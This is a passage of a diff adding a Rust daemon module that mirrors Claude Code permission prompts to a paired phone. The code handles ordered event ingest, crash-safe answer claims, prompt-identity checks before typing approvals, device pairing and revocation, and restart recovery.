@@ -1,0 +1,5918 @@
+//! Daemon state and the paths that mutate it.
+//!
+//! Everything that can change a session lives here so the ordering rules are in
+//! one place:
+//!
+//!   * **Ingest** assigns `seq` (in the store) and then broadcasts, and does
+//!     both **under one per-session gate**. Assigning and publishing are two
+//!     steps, so without the gate two tasks can commit 1 and 2 and then publish
+//!     2 and 1 — and a subscriber that has seen 2 has no way to accept 1
+//!     afterwards. The gate makes "the order events were assigned" and "the
+//!     order they were published" the same sentence. A subscriber that joins
+//!     between the two steps still sees the event, because `subscribe` reads
+//!     the backlog *after* joining the broadcast and drops anything at or below
+//!     its watermark.
+//!   * **Answering** serialises per request, claims in memory, claims *durably*,
+//!     applies, then records the terminal outcome. Serialising first is what
+//!     makes a duplicate tap arriving *during* an injection return the original
+//!     outcome rather than a rejection. The durable claim is what makes a
+//!     daemon killed mid-injection able to say "I do not know whether that
+//!     landed" instead of typing a second time into a live TTY.
+//!   * **Prompt identity.** A card is bound to a *generation* (a per-run counter
+//!     that advances on every structured permission request) and to a
+//!     *fingerprint* of the prompt block on the visible pane. An answer is
+//!     applied only if both still hold at the moment of typing. When neither can
+//!     be established the answer is refused: the human at the keyboard can see
+//!     the screen, and we cannot.
+//!
+//! **Identity.** Every map here is keyed by `session_uid`, never by the tmux
+//! name. The name is reused by the next session, so keying by it meant a new run
+//! adopted the dead one's supervisor slot, its log and its answered approvals.
+//! Anything a client names is resolved through [`Daemon::resolve`] first, which
+//! is the single place that decides what a bare `cc-1` refers to.
+
+use std::collections::HashMap;
+use std::sync::Arc;
+use std::time::Duration;
+
+use anyhow::{anyhow, Result};
+use protocol::event::{
+    Event, EventKind, Lifecycle, Link, PendingEvent, SessionKey, SessionSummary, Source,
+};
+use protocol::hash::{approval_payload_hash, approval_payload_text, sha256_hex};
+use protocol::hook::{Decision, HookDecision, HookEventName, HookInput};
+use protocol::ipc::{
+    DaemonFrame, HookPost, PromptFingerprint, PromptPresence, RegisterSession, SupervisorRequest,
+    SupervisorResult,
+};
+use protocol::pairing::DeviceSummary;
+use protocol::ws::{
+    AnswerDecision, AnswerOutcome, AnswerPath, AnswerResult, ApprovalCard, ResolvedBy,
+    SendTextResult,
+};
+use tokio::sync::{broadcast, mpsc, oneshot, Mutex};
+
+use crate::apns::{PushHint, PushSender};
+use crate::db::Db;
+use crate::store::{
+    AnswerClaim, DeviceLookup, DeviceRow, LedgerWrite, PairingConsume, PendingApprovalRow,
+    SessionRow, Store, TextClaim,
+};
+use protocol::config::Config;
+
+/// Broadcast ring size. A subscriber that falls this far behind gets an
+/// explicit `Resync` rather than a silent gap.
+const BROADCAST_CAPACITY: usize = 1024;
+
+/// Revocation ring size. Tiny on purpose: a human revoking devices produces a
+/// handful of messages in a lifetime, and a connection that somehow lags off
+/// this ring still has the per-message and keepalive lookups underneath it.
+const REVOCATION_CAPACITY: usize = 64;
+
+/// Consecutive pane captures without the prompt before an approval is called
+/// locally resolved. Two, not one: a capture can land during a redraw, and a
+/// single blank frame is not evidence that a human answered.
+const LOCAL_RESOLVE_MISSES: u32 = 2;
+
+/// The supervisor feature level that can honour a prompt fingerprint. A
+/// supervisor below this ignores the `expect` field, so an approval sent to one
+/// would be typed against a screen nobody checked.
+const SUPERVISOR_MINOR_PROMPT_IDENTITY: u32 = 3;
+
+/// How long, and how often, to look for the prompt a card was raised for.
+///
+/// The hook fires microseconds *before* Claude renders the prompt (measured), so
+/// fingerprinting synchronously would find nothing every time.
+/// Polling briefly afterwards costs a handful of `capture-pane` calls per
+/// approval and is invisible to the hook, which has already returned.
+const PROMPT_SETTLE_ATTEMPTS: u32 = 6;
+const PROMPT_SETTLE_INTERVAL: Duration = Duration::from_millis(150);
+
+/// `(session_uid, request_id)`. An approval belongs to one run, and a request id
+/// is only unique within one.
+type ApprovalId = (String, String);
+
+/// Where the phone should connect. Resolved once at startup and printed into
+/// the QR, so the code the operator scans and the socket the daemon opened can
+/// never describe different endpoints.
+#[derive(Debug, Clone)]
+pub struct Endpoint {
+    pub host: String,
+    pub port: u16,
+    pub tls: bool,
+}
+
+pub struct Daemon {
+    pub config: Config,
+    /// The synchronous store.
+    ///
+    /// Kept for the handful of places that genuinely have no runtime to defer
+    /// to — the startup integrity check, and the tests. Every path inside an
+    /// `async fn` uses [`Daemon::db`] instead, which runs the same operations on
+    /// the blocking pool rather than on a runtime worker.
+    pub store: Arc<Store>,
+    /// The async handle to the same store. See [`crate::db`].
+    pub db: Db,
+    pub events_tx: broadcast::Sender<Event>,
+    /// Device ids whose access has just been withdrawn.
+    ///
+    /// Revocation used to reach an open socket only when that socket next did
+    /// something — a message, or the 30-second keepalive. A phone sitting idle
+    /// on a subscription kept receiving the event log for up to half a minute
+    /// after the operator revoked it, which is not what `cc revoke` means. This
+    /// is the push half: every connection selects on it and closes immediately
+    /// when its own id arrives, and the periodic lookup stays as the backstop
+    /// for a connection that was not listening when the message went out.
+    pub revocations_tx: broadcast::Sender<String>,
+    pub push: Arc<dyn PushSender>,
+    pub endpoint: Endpoint,
+    /// When this process started, and which launchd job it belongs to. Captured
+    /// once at construction: `XPC_SERVICE_NAME` is set by launchd at exec, and
+    /// reading it later would be reading whatever the environment has become.
+    started_at: String,
+    launchd_label: Option<String>,
+    inner: Mutex<Inner>,
+    /// One gate per run, held across *both* halves of an ingest.
+    ///
+    /// Separate from `inner` on purpose: it is held while SQLite commits, and
+    /// folding it into the state lock would serialise every unrelated query
+    /// behind a write. Kept in its own map so the lock ordering is one-way —
+    /// gate, then `inner`, never the reverse.
+    publish_gates: Mutex<HashMap<String, Arc<Mutex<()>>>>,
+    /// Signals the tailer that a run's transcript path is known: `(uid, path)`.
+    transcript_tx: mpsc::UnboundedSender<(String, String)>,
+}
+
+/// How a `hello` was (or was not) authenticated.
+#[derive(Debug)]
+pub enum AuthOutcome {
+    /// The static bearer token from `cc token`.
+    Static,
+    /// A per-device token minted by an earlier pairing.
+    Device(Box<DeviceRow>),
+    /// A pairing code was redeemed; these credentials are new.
+    Paired {
+        device_id: String,
+        device_name: String,
+        token: String,
+        ssh_key_installed: bool,
+    },
+    /// Refused. The string is for *our* log; the peer gets one opaque error,
+    /// because telling an unauthenticated caller which of "wrong", "expired"
+    /// and "already used" applies is a free oracle.
+    Rejected(String),
+}
+
+/// What `cc revoke` / `cc ssh-revoke` did.
+#[derive(Debug)]
+pub struct RevokeOutcome {
+    pub device: DeviceSummary,
+    pub token_revoked: bool,
+    pub ssh_key_removed: bool,
+}
+
+#[derive(Default)]
+struct Inner {
+    /// Keyed by `session_uid`. A second run of the same name gets its own slot
+    /// instead of evicting the first's supervisor.
+    supervisors: HashMap<String, SupervisorHandle>,
+    pending: HashMap<ApprovalId, PendingApproval>,
+    /// Monotonic, so a supervisor's old connection cannot release the slot its
+    /// new one has taken. Never reused; a `u64` of registrations is not a
+    /// number this daemon will reach.
+    next_epoch: u64,
+    /// One async lock per outstanding approval, so two taps on the same card are
+    /// applied one after the other rather than one being rejected mid-flight.
+    ///
+    /// A `tokio::sync::Mutex` and not a flag: the loser has to *wait* for the
+    /// winner's ledger write before it can be told the original outcome, and the
+    /// wait spans an await (typing into a TTY).
+    answer_locks: HashMap<ApprovalId, Arc<Mutex<()>>>,
+    /// `(session_uid, prompt_id, tool_name, input_hash)` -> `tool_use_id`.
+    ///
+    /// PermissionRequest carries no `tool_use_id` on claude 2.1.220, but the
+    /// PreToolUse that fires microseconds earlier does. Correlating gives every
+    /// approval a stable, agent-side identity for idempotency.
+    tool_use_ids: HashMap<String, String>,
+    last_seen_ms: HashMap<String, i64>,
+    /// When pairing attempts failed, inside the current window.
+    ///
+    /// Oldest first, and never longer than `pairing_max_attempts`, so this is a
+    /// fixed-size structure rather than an unbounded record of everything that
+    /// has ever knocked. Memory-only on purpose: a restart clearing the counter
+    /// costs an attacker one daemon crash they cannot cause, and persisting it
+    /// would mean a failed guess could lock the operator out of pairing.
+    pairing_failures: std::collections::VecDeque<i64>,
+    /// Per run: how many structured permission requests have been seen.
+    ///
+    /// The authoritative answer to "is this card still the current prompt?".
+    /// Unlike anything read off the screen it needs no capture, cannot be
+    /// spoofed by scrollback, and is exact — a card raised at generation N is
+    /// answering a prompt that generation N+1 has already replaced.
+    prompt_generation: HashMap<String, u64>,
+}
+
+pub struct SupervisorHandle {
+    tx: mpsc::Sender<DaemonFrame>,
+    inflight: Arc<std::sync::Mutex<HashMap<String, oneshot::Sender<SupervisorResult>>>>,
+    next_id: Arc<std::sync::atomic::AtomicU64>,
+    /// Which registration this handle belongs to. A supervisor that reconnects
+    /// registers again under the same uid, so "remove the entry for this uid" is
+    /// not the same question as "remove *my* entry".
+    epoch: u64,
+    /// What this supervisor can honour. A supervisor from an in-place upgrade
+    /// reports 0 and silently ignores the prompt fingerprint, so the daemon
+    /// refuses to actuate a permission prompt through it.
+    protocol_minor: u32,
+}
+
+/// Owns one entry in a supervisor's in-flight map for as long as the request is
+/// outstanding.
+///
+/// The map used to be pruned only by an arriving response, so a request that
+/// timed out, was refused by a full queue, or belonged to a supervisor that went
+/// away left its `oneshot::Sender` behind permanently. A supervisor lives as
+/// long as its session, so that is an unbounded leak on the *stall* path — the
+/// one that fires exactly when the daemon is already under stress. Tying removal
+/// to a `Drop` makes it correct on every exit path rather than on the ones
+/// somebody remembered to write.
+struct InflightSlot {
+    id: String,
+    inflight: Arc<std::sync::Mutex<HashMap<String, oneshot::Sender<SupervisorResult>>>>,
+}
+
+impl Drop for InflightSlot {
+    fn drop(&mut self) {
+        self.inflight
+            .lock()
+            .unwrap_or_else(|p| p.into_inner())
+            .remove(&self.id);
+    }
+}
+
+/// What a connection got back for registering, and what it must hand back to
+/// unregister. Carrying the epoch is what stops a supervisor's *old* connection
+/// tearing down the slot its *new* connection has just taken.
+#[derive(Debug, Clone)]
+pub struct Registration {
+    pub session: SessionKey,
+    epoch: u64,
+}
+
+/// Why a supervisor round-trip produced no result.
+///
+/// The distinction is the difference between "you may try again" and "never try
+/// this again", so it is a type rather than a message somebody has to parse.
+#[derive(Debug)]
+enum SupervisorFailure {
+    /// The request never reached a supervisor. Nothing can have happened.
+    NotSent(String),
+    /// It was sent and never answered. It may have acted.
+    Unanswered(String),
+}
+
+impl std::fmt::Display for SupervisorFailure {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            SupervisorFailure::NotSent(reason) | SupervisorFailure::Unanswered(reason) => {
+                f.write_str(reason)
+            }
+        }
+    }
+}
+
+impl std::error::Error for SupervisorFailure {}
+
+/// What an attempt to actuate a decision actually did.
+///
+/// Three outcomes, not two. A caller that only has success and failure cannot
+/// tell "the supervisor refused, so nothing was typed" from "the supervisor
+/// never answered, so it might have" — and those demand opposite recoveries:
+/// one may be retried, the other must never be.
+enum Actuation {
+    Applied {
+        via: AnswerPath,
+        detail: Option<String>,
+    },
+    /// Positively declined before injecting. Nothing was typed.
+    Refused(String),
+    /// No confirmation, and none is coming. Treated as "it may have typed".
+    Unknown(String),
+}
+
+struct PendingApproval {
+    card: ApprovalCard,
+    session: SessionKey,
+    created_ms: i64,
+    /// Set only while a hook is actually blocked on us (`hold_ms > 0`).
+    responder: Option<oneshot::Sender<HookDecision>>,
+    claimed: bool,
+    /// Consecutive pane captures in which the permission prompt was absent.
+    local_misses: u32,
+    /// A tool result arrived for this request id, so the call ran — which only
+    /// happens if somebody approved it. Positive evidence, unlike an absent
+    /// prompt, and it carries the decision with it.
+    tool_ran: bool,
+    /// Which prompt this card belongs to. Compared against the run's current
+    /// generation before anything is typed.
+    generation: u64,
+    /// The prompt block as it looked when this card's prompt first appeared.
+    ///
+    /// `None` means identity was never established — the supervisor was gone,
+    /// the capture failed, or the prompt never showed up where we could see it.
+    /// Remote actuation of the prompt is refused while this is `None`, which is
+    /// the fail-toward-the-human direction: the card is still shown, and the
+    /// person at the keyboard still has it in front of them.
+    prompt: Option<PromptFingerprint>,
+}
+
+impl Daemon {
+    pub fn new(
+        config: Config,
+        store: Arc<Store>,
+        push: Arc<dyn PushSender>,
+        endpoint: Endpoint,
+        transcript_tx: mpsc::UnboundedSender<(String, String)>,
+    ) -> Arc<Daemon> {
+        let (events_tx, _) = broadcast::channel(BROADCAST_CAPACITY);
+        let (revocations_tx, _) = broadcast::channel(REVOCATION_CAPACITY);
+        let db = Db::new(Arc::clone(&store));
+        Arc::new(Daemon {
+            config,
+            store,
+            db,
+            events_tx,
+            revocations_tx,
+            push,
+            endpoint,
+            started_at: protocol::time::now_rfc3339(),
+            launchd_label: launchd_label(),
+            inner: Mutex::new(Inner::default()),
+            publish_gates: Mutex::new(HashMap::new()),
+            transcript_tx,
+        })
+    }
+
+    /// Re-derive from the database everything a restart would otherwise lose.
+    ///
+    /// Two things, both of which used to be memory-only:
+    ///
+    /// 1. **Open approval cards.** A card is a durable fact in the log and a
+    ///    live question on somebody's phone; after a restart the daemon used to
+    ///    answer "unknown or already-resolved request" to a tap on a card that
+    ///    was still on screen. Recovered cards come back with **no** prompt
+    ///    fingerprint: whatever is on the pane now was never checked against
+    ///    them, and the local sweep re-establishes identity (or resolves the
+    ///    card) against what is actually visible.
+    /// 2. **Mutations that were claimed but never settled.** A claim with no
+    ///    outcome means the daemon died between typing and recording. That is
+    ///    recorded as a terminal *indeterminate* result, and never retried.
+    pub async fn recover(&self) {
+        let now = protocol::time::now_rfc3339();
+
+        match self.db.unresolved_answer_claims().await {
+            Ok(claims) if !claims.is_empty() => {
+                crate::log_warn!(
+                    "recovery: {} answer(s) were claimed but never settled; recording them as \
+                     indeterminate rather than typing again",
+                    claims.len()
+                );
+                for claim in claims {
+                    self.settle_indeterminate(&claim).await;
+                }
+            }
+            Ok(_) => {}
+            Err(err) => crate::log_error!("recovery: could not read answer claims: {err:#}"),
+        }
+
+        match self.db.recover_text_mutations(now.clone()).await {
+            Ok(0) => {}
+            Ok(count) => crate::log_warn!(
+                "recovery: {count} send_text mutation(s) were in flight and their outcome is \
+                 unknown; a retry will be told so rather than typing again"
+            ),
+            Err(err) => crate::log_error!("recovery: could not settle send_text claims: {err:#}"),
+        }
+
+        match self.db.list_pending_approvals().await {
+            Ok(rows) if !rows.is_empty() => {
+                // Counted up front, before the state lock is taken.
+                //
+                // The generation of a run is the number of approval requests it
+                // has logged, and reading that is a database query. Doing it
+                // inside the loop would mean awaiting the blocking pool while
+                // holding `inner` — which the lock ordering forbids and which
+                // would serialise every other task behind a restart's recovery.
+                // One query per distinct run rather than one per card, so a
+                // session with twenty open cards costs one.
+                let mut counted: HashMap<String, u64> = HashMap::new();
+                for uid in rows
+                    .iter()
+                    .map(|row| row.session_uid.clone())
+                    .collect::<std::collections::BTreeSet<_>>()
+                {
+                    match self
+                        .db
+                        .count_events_of_kind(uid.clone(), EventKind::ApprovalRequest)
+                        .await
+                    {
+                        Ok(count) => {
+                            counted.insert(uid, count);
+                        }
+                        // Left absent, so the card's own generation is used —
+                        // the same fallback the previous `unwrap_or` gave.
+                        Err(err) => crate::log_error!(
+                            "recovery: could not count approval requests for {uid}: {err:#}"
+                        ),
+                    }
+                }
+
+                let mut inner = self.inner.lock().await;
+                let mut restored = 0usize;
+                for row in rows {
+                    let Ok(card) = serde_json::from_str::<ApprovalCard>(&row.card) else {
+                        crate::log_error!(
+                            "recovery: dropping an undecodable pending card for {}",
+                            row.request_id
+                        );
+                        continue;
+                    };
+                    // The run's current generation is the number of approval
+                    // requests it has logged — the same derivation the live path
+                    // uses, so a recovered card is compared against the same
+                    // scale it was created on.
+                    let current = counted
+                        .get(&row.session_uid)
+                        .copied()
+                        .unwrap_or(row.generation);
+                    let generation = inner
+                        .prompt_generation
+                        .entry(row.session_uid.clone())
+                        .or_insert(0);
+                    *generation = (*generation).max(current).max(row.generation);
+                    inner.pending.insert(
+                        (row.session_uid.clone(), row.request_id.clone()),
+                        PendingApproval {
+                            card,
+                            session: SessionKey::new(&row.session_uid, &row.session_id),
+                            created_ms: row.created_ms,
+                            responder: None,
+                            claimed: false,
+                            local_misses: 0,
+                            tool_ran: false,
+                            generation: row.generation,
+                            // Deliberately not carried across the restart: it
+                            // described a screen this process never saw.
+                            prompt: None,
+                        },
+                    );
+                    restored += 1;
+                }
+                crate::log_info!(
+                    "recovery: {restored} approval card(s) restored; each is re-checked against \
+                     the pane before it can be answered"
+                );
+            }
+            Ok(_) => {}
+            Err(err) => crate::log_error!("recovery: could not read pending approvals: {err:#}"),
+        }
+    }
+
+    /// Record a claimed-but-unsettled answer as a terminal unknown.
+    async fn settle_indeterminate(&self, claim: &AnswerClaim) {
+        let session = SessionKey::new(&claim.session_uid, &claim.session_id);
+        let decision =
+            serde_json::from_str::<AnswerDecision>(&claim.decision).unwrap_or(AnswerDecision::Deny);
+        let outcome = AnswerOutcome {
+            request_id: claim.request_id.clone(),
+            session_id: session.name.clone(),
+            decision,
+            resolved_by: ResolvedBy::Phone,
+            applied_via: AnswerPath::SendKeys,
+            resolved_at: protocol::time::now_rfc3339(),
+            detail: Some(format!(
+                "the daemon stopped between typing this answer and recording it (claimed at {}); \
+                 whether it reached the agent was never observed, and it will not be typed again",
+                claim.started_at
+            )),
+            inferred: false,
+            indeterminate: true,
+        };
+        if let Err(err) = self
+            .db
+            .record_answer(
+                claim.session_uid.clone(),
+                claim.request_id.clone(),
+                claim.payload_hash.clone(),
+                outcome.clone(),
+            )
+            .await
+        {
+            crate::log_error!(
+                "recovery: could not record the indeterminate outcome for {}: {err:#}",
+                claim.request_id
+            );
+            return;
+        }
+        let _ = self
+            .store
+            .delete_pending_approval(&claim.session_uid, &claim.request_id);
+        let pending = PendingEvent::new(
+            &session,
+            EventKind::ApprovalResolved,
+            serde_json::to_value(&outcome).unwrap_or(serde_json::Value::Null),
+            Source::Daemon,
+        )
+        .with_source_event_id(format!("resolved:{}", claim.request_id));
+        if let Err(err) = self.ingest(pending).await {
+            crate::log_error!("recovery: could not record the resolution event: {err:#}");
+        }
+    }
+
+    /// The daemon's own account of itself, for `cc daemon status` and for
+    /// `cc daemon install` deciding whether it is about to fight a process
+    /// somebody started by hand.
+    pub async fn info(&self) -> protocol::ipc::DaemonInfo {
+        protocol::ipc::DaemonInfo {
+            pid: std::process::id(),
+            version: env!("CARGO_PKG_VERSION").to_string(),
+            protocol_version: protocol::PROTOCOL_VERSION,
+            protocol_minor: protocol::PROTOCOL_MINOR,
+            started_at: self.started_at.clone(),
+            launchd_label: self.launchd_label.clone(),
+            endpoint_host: self.endpoint.host.clone(),
+            endpoint_port: self.endpoint.port,
+            tls: self.endpoint.tls,
+            sessions: self.inner.lock().await.supervisors.len(),
+        }
+    }
+
+    // ---------------------------------------------------------------- ingest
+
+    /// The gate that makes assignment order and publication order the same.
+    ///
+    /// One `tokio::sync::Mutex` per run, dropped once nothing else holds it so a
+    /// long-lived daemon does not accumulate one per session it ever saw.
+    async fn publish_gate(&self, session_uid: &str) -> Arc<Mutex<()>> {
+        let mut gates = self.publish_gates.lock().await;
+        gates.retain(|_, gate| Arc::strong_count(gate) > 1);
+        Arc::clone(gates.entry(session_uid.to_string()).or_default())
+    }
+
+    /// Persist a fact and fan it out. Returns `None` if it was a duplicate.
+    pub async fn ingest(&self, pending: PendingEvent) -> Result<Option<Event>> {
+        let mut pending = pending;
+        self.truncate_payload(&mut pending);
+        let session_uid = pending.session_uid.clone();
+
+        let gate = self.publish_gate(&session_uid).await;
+        let event = {
+            let _ordered = gate.lock().await;
+            let event = self.db.append_event(pending.clone()).await?;
+            if let Some(event) = &event {
+                // Published inside the gate, so no later seq can overtake this
+                // one on the way to a socket. A send error only means nobody is
+                // subscribed; the log already has it.
+                let _ = self.events_tx.send(event.clone());
+            }
+            event
+        };
+
+        if let Some(event) = &event {
+            let mut inner = self.inner.lock().await;
+            inner
+                .last_seen_ms
+                .insert(session_uid, protocol::time::now_unix_ms());
+            note_tool_result(&mut inner, event);
+        }
+        Ok(event)
+    }
+
+    /// Persist a transcript batch **and** its cursor in one transaction, then
+    /// publish what committed.
+    ///
+    /// The only batch ingest there is, and it always carries a cursor. A batch
+    /// path without one would be a second way to consume transcript lines, and
+    /// the invariant here is that consuming lines and recording that they were
+    /// consumed cannot be two separate writes: a crash between them skips those
+    /// lines permanently, because the cursor already claims they are done.
+    pub async fn ingest_scan(
+        &self,
+        session_uid: &str,
+        pendings: Vec<PendingEvent>,
+        cursor: crate::store::TailCursor,
+    ) -> Result<usize> {
+        let mut pendings = pendings;
+        for pending in &mut pendings {
+            self.truncate_payload(pending);
+        }
+
+        let gate = self.publish_gate(session_uid).await;
+        let events = {
+            // The gate is a `tokio::sync::Mutex` and is held *across* the
+            // commit's await, which is what keeps "the order events were
+            // assigned" and "the order they were published" the same sentence
+            // now that the commit happens on a blocking thread. Moving the work
+            // off the runtime does not move the ordering.
+            let _ordered = gate.lock().await;
+            let events = self
+                .db
+                .append_batch_with_cursor(session_uid.to_string(), pendings, cursor)
+                .await?;
+            // Published only after the commit, and only inside the gate: a
+            // subscriber can never be shown a fact the log would lose on the
+            // next `kill -9`, nor one that arrives before its predecessor.
+            for event in &events {
+                let _ = self.events_tx.send(event.clone());
+            }
+            events
+        };
+
+        if !events.is_empty() {
+            self.inner
+                .lock()
+                .await
+                .last_seen_ms
+                .insert(session_uid.to_string(), protocol::time::now_unix_ms());
+        }
+        Ok(events.len())
+    }
+
+    /// Cap a single payload so one enormous tool response cannot bloat the log
+    /// or blow past a WebSocket frame limit. The fact survives; only the bulk is
+    /// dropped, and the truncation is recorded rather than hidden.
+    ///
+    /// The cut lands on a character boundary. `String::truncate` **panics** on
+    /// any other byte, and a tool response is exactly the kind of payload that
+    /// carries multi-byte text — a path with an accent, a diff with an emoji —
+    /// so the naive cut was a panic waiting for the right file name.
+    fn truncate_payload(&self, pending: &mut PendingEvent) {
+        let encoded = pending.payload.to_string();
+        // Measured before the cut, not after: the whole point of recording it is
+        // to say how much was dropped, and the truncated length says nothing.
+        let original_bytes = encoded.len();
+        if original_bytes <= self.config.max_payload_bytes {
+            return;
+        }
+        let mut end = self.config.max_payload_bytes;
+        while end > 0 && !encoded.is_char_boundary(end) {
+            end -= 1;
+        }
+        pending.payload = serde_json::json!({
+            "_codeconnect_truncated": true,
+            "_original_bytes": original_bytes,
+            "_preview": &encoded[..end],
+        });
+    }
+
+    /// The hook path. Returns what cc-hook should print.
+    pub async fn handle_hook(self: &Arc<Self>, post: HookPost) -> HookDecision {
+        match self.handle_hook_inner(post).await {
+            Ok(decision) => decision,
+            Err(err) => {
+                crate::log_error!("hook ingest failed: {err:#}");
+                // Our failure must never look like a denial.
+                HookDecision::passthrough()
+            }
+        }
+    }
+
+    async fn handle_hook_inner(self: &Arc<Self>, post: HookPost) -> Result<HookDecision> {
+        let input: HookInput = serde_json::from_value(post.payload.clone()).unwrap_or_default();
+        let event_name = HookEventName::parse(&post.event);
+
+        let session = self
+            .ensure_session(&post.session_id, post.session_uid.as_deref(), &input)
+            .await?;
+
+        match &event_name {
+            HookEventName::PreToolUse => {
+                if let (Some(tool_use_id), Some(key)) = (
+                    input.tool_use_id.clone(),
+                    correlation_key(&session.uid, &input),
+                ) {
+                    let mut inner = self.inner.lock().await;
+                    // Bounded: a long session would otherwise accumulate one
+                    // entry per tool call for the whole run.
+                    if inner.tool_use_ids.len() > 512 {
+                        inner.tool_use_ids.clear();
+                    }
+                    inner.tool_use_ids.insert(key, tool_use_id);
+                }
+                self.ingest(hook_event(&session, &event_name, &post.payload, &input))
+                    .await?;
+            }
+            HookEventName::PermissionRequest => {
+                return self
+                    .handle_permission_request(&session, &post, &input)
+                    .await;
+            }
+            HookEventName::Notification => {
+                self.ingest(
+                    self.notification_event(&session, &post.payload, &input)
+                        .await,
+                )
+                .await?;
+                self.maybe_push(&session, &input).await;
+            }
+            _ => {
+                self.ingest(hook_event(&session, &event_name, &post.payload, &input))
+                    .await?;
+            }
+        }
+
+        if post.wait {
+            // A gate event we do not specifically handle still must not hang.
+            return Ok(HookDecision::passthrough());
+        }
+        Ok(HookDecision::passthrough())
+    }
+
+    async fn handle_permission_request(
+        self: &Arc<Self>,
+        session: &SessionKey,
+        post: &HookPost,
+        input: &HookInput,
+    ) -> Result<HookDecision> {
+        let tool_name = input.tool_name.clone().unwrap_or_else(|| "unknown".into());
+        let tool_input = input.tool_input.clone().unwrap_or(serde_json::Value::Null);
+        let display_text = approval_payload_text(&tool_name, &tool_input);
+        let payload_hash = approval_payload_hash(&tool_name, &tool_input);
+
+        let request_id = {
+            let inner = self.inner.lock().await;
+            correlation_key(&session.uid, input)
+                .and_then(|key| inner.tool_use_ids.get(&key).cloned())
+        };
+
+        // Fall back to a deterministic id derived from the exact request, so a
+        // build that never emits `tool_use_id` still gets stable idempotency.
+        let request_id = request_id.unwrap_or_else(|| {
+            format!(
+                "pr-{}-{}",
+                input.prompt_id.as_deref().unwrap_or("noprompt"),
+                &payload_hash[..16]
+            )
+        });
+
+        // Computed here rather than on the phone: the classification must be
+        // identical for every client, and a phone parsing shell syntax to
+        // decide how alarming to look is a second implementation to keep in
+        // step. It is a rendering hint, never a gate.
+        let risk = protocol::risk::classify(&tool_name, &tool_input);
+
+        let card = ApprovalCard {
+            request_id: request_id.clone(),
+            payload_hash: payload_hash.clone(),
+            tool_name,
+            tool_input,
+            display_text,
+            permission_suggestions: input.permission_suggestions.clone(),
+            prompt_id: input.prompt_id.clone(),
+            permission_mode: input.permission_mode.clone(),
+            risk: Some(risk.clone()),
+            // The prompt this card belongs to. Derived from the log rather than
+            // from a counter, so a replayed hook cannot advance it and a restart
+            // cannot lose it.
+            generation: self
+                .db
+                .count_events_of_kind(session.uid.clone(), EventKind::ApprovalRequest)
+                .await?
+                + 1,
+            // Not yet: the prompt is not on screen when this hook fires. Bound a
+            // few hundred milliseconds later, and announced when it is.
+            identity_bound: false,
+        };
+        let generation = card.generation;
+
+        let payload = serde_json::json!({ "card": card, "hook": post.payload });
+        let pending = PendingEvent::new(session, EventKind::ApprovalRequest, payload, Source::Hook)
+            .with_source_event_id(format!("perm:{request_id}"));
+
+        // A duplicate is a *replay*, not a re-ask. Ignoring this result and
+        // inserting anyway meant a hook redelivered after the card had already
+        // been answered put a phantom block back on the session — one nothing
+        // would ever resolve, because its answer was already in the ledger.
+        //
+        // Nothing above this line mutated any state, so a replay leaves through
+        // here having changed exactly nothing: no card, no generation, no
+        // superseded neighbours.
+        if self.ingest(pending).await?.is_none() {
+            crate::log_debug!(
+                "duplicate PermissionRequest for {request_id} in {}; state left alone",
+                session.name
+            );
+            return Ok(HookDecision::ask(
+                "CodeConnect: mirrored to your phone; answer here or there",
+            ));
+        }
+
+        let hold = Duration::from_millis(self.config.hold_ms);
+        let (responder_tx, responder_rx) = if hold.is_zero() {
+            (None, None)
+        } else {
+            let (tx, rx) = oneshot::channel::<HookDecision>();
+            (Some(tx), Some(rx))
+        };
+
+        // A new structured request means the previous prompt is gone: Claude
+        // asks one thing at a time, so whatever was on screen has been answered
+        // or withdrawn. Recording the new generation is what makes an older card
+        // un-answerable; superseding is what stops it sitting on the phone
+        // pretending it can still be tapped.
+        self.inner
+            .lock()
+            .await
+            .prompt_generation
+            .insert(session.uid.clone(), generation);
+        self.supersede_older_cards(session, generation, &request_id)
+            .await;
+
+        let created_ms = protocol::time::now_unix_ms();
+        {
+            let mut inner = self.inner.lock().await;
+            inner.pending.insert(
+                (session.uid.clone(), request_id.clone()),
+                PendingApproval {
+                    card: card.clone(),
+                    session: session.clone(),
+                    created_ms,
+                    responder: responder_tx,
+                    claimed: false,
+                    local_misses: 0,
+                    tool_ran: false,
+                    generation,
+                    prompt: None,
+                },
+            );
+        }
+        self.persist_pending(session, &card, generation, created_ms)
+            .await;
+
+        // The prompt is not on screen yet — the hook runs microseconds before
+        // Claude draws it — so identity is established just behind it, off the
+        // hook's critical path.
+        self.spawn_prompt_binding(session.clone(), request_id.clone(), generation);
+
+        let name = &session.name;
+        self.push.send(&PushHint {
+            session_id: name.clone(),
+            // The risk class is the one thing worth putting on a lock screen:
+            // it is the difference between "look when you get a moment" and
+            // "look now", and it leaks nothing about the command itself.
+            title: match risk.class {
+                protocol::risk::RiskClass::High => format!("{name} needs you — high risk"),
+                _ => format!("{name} needs you"),
+            },
+            body: format!("{} approval", card.tool_name),
+            blocked_sessions: self.blocked_session_count().await,
+        });
+
+        // hold_ms == 0 by default: in mirror mode the *local* prompt is what the
+        // phone's answer is typed into, so delaying it would delay the answer.
+        // On claude 2.1.220 this `ask` renders nothing for PermissionRequest —
+        // it is the semantically correct answer, and it costs nothing.
+        let Some(rx) = responder_rx else {
+            return Ok(HookDecision::ask(
+                "CodeConnect: mirrored to your phone; answer here or there",
+            ));
+        };
+        match tokio::time::timeout(hold, rx).await {
+            Ok(Ok(decision)) => Ok(decision),
+            _ => Ok(HookDecision::ask(
+                "CodeConnect: held for you but no answer arrived, deferring to local operator",
+            )),
+        }
+    }
+
+    // ------------------------------------------------------- prompt identity
+
+    /// Retire every card in this run that an arriving prompt has replaced.
+    ///
+    /// Claude asks one thing at a time, so a new structured request means the
+    /// previous prompt is off the screen. Leaving its card open would leave a
+    /// tappable button on the phone for a question nobody can answer any more —
+    /// and, before generations existed, tapping it typed into whatever prompt
+    /// had taken its place.
+    ///
+    /// A *claimed* card is left alone: an injection is already in flight for it
+    /// and its own path owns the outcome.
+    async fn supersede_older_cards(
+        &self,
+        session: &SessionKey,
+        generation: u64,
+        keep: &str,
+    ) -> usize {
+        let stale: Vec<String> = {
+            let inner = self.inner.lock().await;
+            inner
+                .pending
+                .iter()
+                .filter(|((uid, request_id), entry)| {
+                    uid == &session.uid
+                        && request_id != keep
+                        && entry.generation < generation
+                        && !entry.claimed
+                })
+                .map(|((_, request_id), _)| request_id.clone())
+                .collect()
+        };
